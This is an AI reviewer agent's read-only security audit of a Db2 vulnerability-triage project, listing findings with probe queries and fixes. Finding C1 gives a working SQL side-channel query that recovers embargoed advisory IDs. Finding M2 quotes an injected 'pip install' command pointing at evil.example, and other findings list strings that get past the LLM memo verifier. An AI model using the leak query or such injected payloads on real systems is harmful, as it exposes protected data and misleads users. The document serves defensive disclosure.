# NEEDLE independent review (Claude, read-only)

Date: 2026-11-09, about 19:50-20:10 CST. Reviewer: Claude (independent reviewer agent).
Scope: `sql/*.sql`, `src/needle/*.py`, `scripts/*`, `docker-compose.yml`, `.env.example`, README quickstart and Security.
Method: code reading, plus read-only `SELECT` probes against VECDB at localhost:50000 as `DB2INST1` and `NDL_JUNIOR`
(autocommit on, no INSERT/UPDATE/DELETE/DDL; no password printed), plus pure-Python calls of `needle.verify`.
The tree changed during the review (`sql/04_rcac.sql` gained Step 2b at 19:56; `scripts/load_postings_in_codespace.py`,
`scripts/load_in_codespace.py` and others changed at 19:59-20:00). Line numbers refer to the files as of about 20:05 CST.

Severity: CRITICAL = breaks the security claim the submission is built on, reachable now.
HIGH = breaks a stated guarantee or is one routine command away from a leak. MEDIUM / LOW = real, smaller impact.
PLAUSIBLE = part of the scenario was not executed; the label says which part.

---

## CRITICAL

### C1. Any analyst reconstructs the embargoed advisories (IDs, aliases, full vocabulary) from `NEEDLE.TERM_DF`
- Files: `sql/04_rcac.sql:139-140,150-151` (SELECT on `TERM_DF` / `CORPUS_STATS` to every analyst),
  `sql/04_rcac.sql:156-158` (comment claims the stats "never" leak "an advisory ID or text": false),
  `sql/02_bm25.sql:23-26,50-53` (`TERM_DF` = DF over ALL postings, no RCAC), `src/needle/tokenize.py:50-62`
  (`index_text` indexes `adv_id` and every alias, so each advisory ID is itself a term).
- Scenario (run as NDL_JUNIOR, one statement, SELECT privilege only):
  ```sql
  WITH V (TERM, C) AS (SELECT TERM, COUNT(*) FROM NEEDLE.POSTING GROUP BY TERM)   -- RCAC-filtered
  SELECT T.TERM, T.DF, COALESCE(V.C, 0) FROM NEEDLE.TERM_DF T LEFT JOIN V ON V.TERM = T.TERM
  WHERE T.DF > COALESCE(V.C, 0);                                                   -- global minus visible
  ```
- Measured (2026-11-10 ~02:00 UTC, counts only, IDs not printed):
  - the result is **set-equal** to the vocabulary of the 25 embargoed advisories as `DB2INST1` sees it (2,568 terms, 0 differences);
  - 521 of those terms occur only in embargoed advisories; they include **25/25 embargoed GHSA IDs** and
    **25/25 of their CVE aliases** (a simpler `TERM LIKE 'ghsa-%'` minus visible `ADV_DOC`/`ADV_ALIAS` gives the same 25/25);
  - NDL_JUNIOR row count on `ADV_DOC` is 26,185 (= 26,210 - 25), so the row permission itself works; the side table bypasses it.
  - The new Step 2b demo embargo (`04_rcac.sql:62-68`, GHSA-5x8w-8jj5-q52h, "NDL_JUNIOR cannot see at all") is exposed the same way.
- Secondary channel: `NEEDLE.BM25_SEARCH` returns `KW_SCORE` (`03_triage_proc.sql:27`), computed from global N/DF, so a
  single-term call on a visible document is an IDF (= global DF) oracle for shared terms.
- Fix (minimal): `REVOKE SELECT ON NEEDLE.TERM_DF, NEEDLE.CORPUS_STATS FROM USER NDL_SENIOR, ..., NDL_P75` and compute
  DF for the at most 64 query terms inside `BM25_SEARCH` from `NEEDLE.POSTING` (RCAC-filtered, index-only on
  `POSTING_PK_IX`), and N/AVGDL from visible rows; or build `TERM_DF`/`CORPUS_STATS` only from rows every analyst may
  see. Re-run `tests/test_triage_rcac.py` as NDL_JUNIOR after the REVOKE (not verified here: whether `TRIAGE_MODE`'s
  dynamic SQL still needs direct SELECT on the stats tables). Add the query above as a leak test. Correct
  `04_rcac.sql:156-158` and the README.

---

## HIGH

### H1. The memo verifier keeps false "not affected" and "vulnerable/exposed" claims
- Files: `src/needle/verify.py:32-39` (`SAFETY_RE`), `:40-42` (`AFFECTED_CLAIM_RE`, `NOT_AFFECTED_CONTEXT_RE`),
  `:112-119` (`_mentions` matches single tokens), `:138-144`; claim "the verifier is the guarantee" in
  `src/needle/llm_summary.py:8-9` and `README.md:339-340`.
- Measured with `build_evidence` + `verify_memo` (ml-feature-store = AFFECTED, payments-api = NOT_CONFIRMED). All KEPT:
  - `ml-feature-store isn't affected by this issue.` (an AFFECTED service declared not affected)
  - `ml-feature-store does not need a patch.`
  - `payments-api is vulnerable to this code execution flaw.` / `payments-api is exposed and must patch today.`
  - `payments-api is affected now, as it was previously.` (any "previously" disables rule 5)
  - `The payments api service is affected.` (space instead of hyphen: service not detected)
- Fix: for every sentence that names a service (normalize by removing spaces, `-`, `_` before matching), require the
  service's exact SQL status word in the sentence; remove any sentence that combines a service or package with a
  negation (`n't|not|no|never|without|does not need`) or with `vulnerable|exposed|impacted|at risk|patched|fixed`
  unless the status is AFFECTED. Prefer generating the service bullets from the SQL rows and let the LLM write only
  the vulnerability description.

### H2. Re-loading POSTING after RCAC setup silently removes the embargo from the keyword leg (PLAUSIBLE)
- Files: `src/needle/ingest_osv.py:34-37` (docs.jsonl has no `embargo_until`), `src/needle/bm25.py:175`
  (`d.get("embargo_until")` is therefore always None), `scripts/load_postings_in_codespace.py:72-98` (TRUNCATE + insert
  `EMBARGO_UNTIL` = NULL, no `CALL NEEDLE.SYNC_POSTING_ACL`), `scripts/run_all.ps1:54,138-142` (default `all` runs
  `postings`, and no step re-syncs the ACL copies).
- Scenario: after `04_rcac.sql` post-load, someone runs `.\scripts\run_all.ps1` or `load_postings_in_codespace.sh`.
  All POSTING rows of embargoed advisories get `EMBARGO_UNTIL` NULL, `POSTING_ROWS` admits them, and NDL_JUNIOR sees
  embargoed ADV_IDs in `SELECT DISTINCT ADV_ID FROM NEEDLE.POSTING`, in `BM25_SEARCH` and in the `TRIAGE_MODE` KW leg.
  (The app drops them later in `retriever.fetch_docs`, but direct calls show them.)
- Current state: consistent (0 POSTING rows of embargoed docs without the embargo copy). Not executed: the reload
  under active RCAC (TRUNCATE behaviour with row access control active was not tested).
- Fix: at the end of the `post` step, `CALL NEEDLE.SYNC_POSTING_ACL(?)` when the procedure exists; better, load
  ROW_BUCKET/EMBARGO_UNTIL from `ADV_DOC` (INSERT ... SELECT join) instead of from the file, and add a check query
  (the A4 query below) to the `check` step that fails on any mismatch.

---

## MEDIUM

### M1. Advisory-ID check is bypassed by Unicode dashes, fullwidth letters and spaces
- File: `src/needle/verify.py:26-29` (`ADV_ID_RE` matches ASCII `-` only).
- Measured, all KEPT although the IDs are not in the SQL results: `GHSA‑aaaa‑bbbb‑cccc` (U+2011),
  `CVE–2099–12345` (U+2013), `CVE 2099 12345`, fullwidth `ＧＨＳＡ-aaaa-bbbb-cccc`. Advisory text that the model
  copies can carry these forms.
- Fix: `unicodedata.normalize("NFKC", memo)`, map every `\p{Pd}` dash to `-`, then also match a loose pattern
  `(GHSA|CVE|PYSEC|OSV|MAL)[\s\W_]*[0-9a-z]{4}...` and remove the sentence when the canonical form is not in evidence.

### M2. Injected advisory text can put commands, URLs and unknown package names into a "verified" memo
- Files: `src/needle/verify.py:105-108` (package detection universe = fleet + retrieved packages only),
  `src/needle/llm_summary.py:75-84`.
- Measured: `Fix: run pip install pyyaml-secure-loader from https://evil.example/x.` is KEPT. MAL-* records are
  attacker-written, so this is the realistic injection payload (typosquat recommendation).
- Fix: remove sentences that contain a URL, a shell/package-manager command (`pip|curl|wget|bash|npm|install`), or a
  package-like token that is not in evidence.

### M3. The Streamlit app is a confused deputy for NDL_SENIOR (PLAUSIBLE: LAN reachability)
- Files: `src/needle/app.py:37-39,106,353` (dropdown picks the user; the server reads every `NDL_*_PASSWORD` from
  `.env`), `.streamlit/config.toml` (no `[server] address`, so Streamlit listens on all interfaces and prints a
  Network URL).
- Scenario: anyone who reaches port 8501 selects NDL_SENIOR and sees embargoed advisories and the affected services.
  RCAC then protects nothing against the browser user. Not tested: whether the host firewall blocks 8501.
- Fix: `[server]` `address = "127.0.0.1"`; state in the README that the user switch is a demo of two Db2 identities,
  not authentication; for real use, ask for the user's own Db2 credentials per session.

### M4. Unbatched 26k-row vector copies: the statement shape that filled the transaction log
- Files: `scripts/connector_findings.py:316-317` (two `INSERT ... SELECT` of all `ADV_DOC` rows with 768-dim vectors,
  one unit of work each); `eval/run_eval.py:409-410` records that this shape filled the log on 2026-11-10.
  The DB2VS fill below it (`:342-361`) is already batched; these two are not.
- Scenario: `scripts/connector_findings.sh setup` again => SQL0964C (log full) and a stalled database for everyone.
- Fix: batch by ADV_ID ranges with a commit per batch (copy `:342-361`), or `ALTER TABLE ... ACTIVATE NOT LOGGED
  INITIALLY` in the same unit of work, or `ADMIN_CMD('LOAD FROM (SELECT ...) OF CURSOR ...')`.

### M5. README Security section states things the code does not do
- `README.md:338`: "a column mask on `DETAILS`". The mask is on `SUMMARY`; Db2 rejected a CLOB mask with SQL0350N
  (`sql/04_rcac.sql:118-129`). Judges are Db2 engineers; this will be checked.
- `README.md:339-340`: "A verifier removes any ID that is not in the SQL results": false per M1.
- `README.md:345-346`: "UNKNOWN_COVERAGE"; the code and UI use `NOT_CONFIRMED`.
- Fix: correct the three sentences; add "global BM25 statistics" to Known Limitations until C1 is fixed.

---

## LOW

- **L1. Range-only advisories produce no exposure row at all.** `src/needle/sbom.py:236-243,289-296` derive packages
  only from `ADV_AFFECTED` (enumerated versions, `ingest_osv.py:157-158`), so no NOT_CONFIRMED row can appear for a
  range-only advisory, and the UI says "No exact package + version match" with 0 NOT_CONFIRMED. Measured from
  `data/docs.jsonl`: 2 of 1,307 non-withdrawn advisories that name a fleet package (both django). Fix: take the
  NOT_CONFIRMED package list from the advisory's package names, not from version rows.
- **L2. Unverified LLM text is rendered.** `src/needle/app.py:337-338` shows "Raw model output (unverified)". Fix: hide
  behind a development flag.
- **L3. `recall@k` is hit@k.** `eval/run_eval.py:89-92` returns 1.0 if any ground-truth ID is in the top k. The
  docstring says so; `set_recall@10` is the actual recall. Rename to `hit@k` (or `success@k`) in charts and README to
  avoid a definitional objection. RRF (`03_triage_proc.sql:130`, `run_eval.py:125-131`), BM25/IDF
  (`03_triage_proc.sql:54-65` = rank_bm25 BM25Okapi incl. epsilon floor), PEP 503 normalization
  (`ingest_osv.py:48-50`, `sbom.py:47-49`, SQL `REGEXP_REPLACE`), and the BUSINESS_TIME window math
  (`sbom.py:287`, `:282`, Python mirror `:347,361,368`; inclusive start, exclusive end) were checked: no defect found.
- **L4. Query-term limits.** `BM25_SEARCH` reads at most 2,048 array elements (`03_triage_proc.sql:43`) from a
  `CLOB(32K)` (`:26`); a very long pasted advisory either fails (value too long) or is pruned differently from
  `bm25.prune_query_terms`, which sees all terms. PLAUSIBLE (not executed). Fix: cap distinct query terms in
  `bm25.query_terms` (for example 512) and document it.
- **L5. One identity holds everything.** `DB2INST1` has DBADM + SECADM + DATAACCESS (`SYSCAT.DBAUTH`, measured), is the
  loader and the eval identity, and has a full-access `USER_ACCESS` row (`04_rcac.sql:33`). A Db2 reviewer will expect
  a separate SECADM that owns the permissions and masks. Fix: create a SECADM user for `04_rcac.sql`; document it.
- **L6. Catalog statistics hold real values.** NDL_JUNIOR can read `SYSCAT.COLDIST` (1,140 NEEDLE rows, measured);
  `RUNSTATS ... WITH DISTRIBUTION` on `ADV_DOC`, `ADV_ALIAS`, `POSTING` stores quantile/frequent values of `ADV_ID`,
  `ALIAS`, `TERM`. Today 0 embargoed IDs are stored there (measured). PLAUSIBLE future leak after a re-RUNSTATS. Fix:
  exclude those columns from distribution statistics, or a restrictive catalog.
- **L7. RCAC-free copy of protected rows.** `NDL_DEV_EVAL.DB2VS_ADV` (filled by `connector_findings.py:347-351`) holds
  `SUMMARY` + `adv_id` of every row, embargoed included, without a permission. No analyst grant today (measured).
  Fix: drop it after the measurement or apply the same row permission.
- **L8. Shell/SQL interpolation in an operator script.** `scripts/rcac_explain_section.sh:8-14` puts the pattern
  argument into `LIKE '$P'` inside a shell string run as db2inst1. Operator input only. Fix: reject `'`, `"`, `` ` ``,
  `$` in the pattern.
- **L9. Reproducibility of the quickstart is UNKNOWN.** `README.md:124,253` still carry `TODO(final)`: the block has not
  been run on a clean host. Concrete risks: `set -a; . ./.env` (`README.md:156`) breaks on passwords with `$`, spaces
  or quotes; every DSN (`PWD={pw};` in `sbom.py:415-417`, `triage.py:63-64`, both loaders) breaks on a `;` in a
  password. Fix: state the allowed password characters in `.env.example`, or quote/escape the DSN value.
- **L10. Informational.** `docker-compose.yml:24` passes `DB2INST1_PASSWORD` as a container environment variable
  (readable with `docker inspect`); this is IBM's documented method for the image.

---

## Checked, no defect found
- **SQL injection:** no SQL text in `src/needle/` is built from user, advisory or query text. `TRIAGE_MODE` concatenates
  only `P_K`/`P_DEPTH` after range checks (`03_triage_proc.sql:95-114`) and binds vector and terms with `USING`.
  `rcac.knn_sql` validates identifiers (`rcac.py:26-34`) and casts integers; `sbom.exposure_sql`, `retriever.fetch_docs`
  and `retriever.fallback_sql` generate only `?` markers and `int()` values. Scripts and eval interpolate code constants.
- **Grants (measured):** analysts hold CONNECT, SELECT on NEEDLE tables and EXECUTE on TRIAGE/TRIAGE_MODE/BM25_SEARCH
  only; no PUBLIC database authority or PUBLIC table grants; NDL_JUNIOR gets SQL0551N on `USER_ACCESS`, `ADV_RAW`,
  `DB2INST1.EXPLAIN_STATEMENT` and `MON_GET_PKG_CACHE_STMT`. No embargoed ID literal is in the package cache.
- **App identity:** the app offers only NDL_SENIOR/NDL_JUNIOR unless `NEEDLE_APP_ALLOW_ADMIN=1` (`app.py:37-39`); every
  statement runs on the selected user's connection; ranked IDs, the SQL expander parameters, exposure rows and LLM
  input are all filtered through `fetch_docs` under that user's RCAC.
- **Secrets:** each of the 7 real password values in `.env` was searched for in every file under `needle/` except `.env`
  and `.venv`: 0 hits. `.env` is ignored by `needle/.gitignore` and the parent `.gitignore`. Setup scripts pass
  passwords on stdin. No password is printed.
- **Connections:** closed in `finally` in `app.do_run`, `sbom.main`, `triage.triage`, `run_eval.main`, both loaders and
  `rcac_sweep`. `run_eval.connect` sets autocommit on (ibm_db_dbi defaults to off).
- **Prompt hygiene:** per-call nonce delimiters and `_defang` work as designed (`llm_summary.py:63-84`); the gaps are in
  the verifier (H1, M1, M2).

## Read-only probe queries used (as DB2INST1 unless noted; IDs never printed)
- A4: `SELECT COUNT(*) FROM NEEDLE.POSTING P JOIN NEEDLE.ADV_DOC D ON D.ADV_ID = P.ADV_ID WHERE D.EMBARGO_UNTIL > CURRENT TIMESTAMP AND (P.EMBARGO_UNTIL IS NULL OR P.EMBARGO_UNTIL <= CURRENT TIMESTAMP)` -> 0
- A5: `SELECT COUNT(*) FROM NEEDLE.ADV_DOC D JOIN NEEDLE.TERM_DF T ON T.TERM = LOWER(D.ADV_ID) WHERE D.EMBARGO_UNTIL > CURRENT TIMESTAMP` -> 25
- J (NDL_JUNIOR): the C1 query -> 2,568 rows, equal to the admin-side embargoed vocabulary; 521 with zero visible postings; 25/25 embargoed IDs among them.
- Grants: `SYSCAT.TABAUTH`, `SYSCAT.ROUTINEAUTH`, `SYSCAT.DBAUTH`; side channels: `SYSCAT.COLDIST`, `MON_GET_PKG_CACHE_STMT`, `MON_GET_UNIT_OF_WORK`.
- Probe scripts (scratchpad, not part of the repo): `probe_ro.py` ... `probe_ro5.py`.
